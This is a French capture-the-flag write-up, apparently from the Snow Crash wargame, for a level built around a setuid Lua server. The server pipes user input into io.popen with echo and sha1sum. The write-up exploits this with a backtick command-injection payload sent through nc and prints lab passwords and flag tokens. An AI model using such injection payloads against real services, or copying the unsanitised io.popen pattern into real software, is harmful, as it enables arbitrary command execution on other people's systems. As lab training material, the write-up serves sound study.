# Level11: Exploit script lua & faille io.popen

> login:password -> *`level11:feulo4b72j7edeahuete3no7c`*
```
:~$ su level11
Password:feulo4b72j7edeahuete3no7c
```
---

```
:~$ pwd
/home/user/level11
```

```
:~$ ls -la
...
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
...
```

Le Home contient un script lua :

```
:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151)) (ici écoute et vérifie le port :5151)

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") (ici il utilise io.popen() pour faire echo du mot de passe reçu avec sha1sum )
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?

```

On remarque que le serveur est déjà lancé, nous pouvons donc utiliser `nc` ou `telnet` sur le port :5151.\
Cependant on peux voir également que c'est un programme qui va attendre le hash d'un mot de passe sur le port :5151, pour le comparer, mais il va également faire un s'en servir pour exécuter une commande.\
On va donc pouvoir exploiter cette faille, directement depuis la demande de `Password:`.

```
:~$ nc localhost 5151
Password: `getflag > /tmp/flag11`
Erf nope..

:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Le flag nous permet de se connecter au level12
`level12:fa6v5ateaw21peobuub8ipe6s`